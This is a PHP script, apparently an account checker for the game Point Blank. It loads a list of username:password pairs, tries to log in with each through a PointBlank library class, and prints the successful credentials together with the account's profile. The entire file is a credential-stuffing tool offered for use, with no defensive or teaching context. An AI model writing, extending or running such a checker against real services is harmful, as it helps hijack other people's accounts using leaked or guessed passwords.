<?php

include_once "vendor/autoload.php";

$list = explode(PHP_EOL, file_get_contents('list.txt'));
ob_start();

foreach ($list as $account) {
	$exp = explode(":", $account);
	$username = $exp[0];
	$password = $exp[1];

	$pb = new PointBlank($username, $password);
	if ($pb->login()) {
		$profile = $pb->getProfile();
		print_message("{$username}:{$password}\t\t => Success Login. {$profile}", '0');
	} else {
		print_message("{$username}\t\t => FAILED LOGIN", 1);
	}
}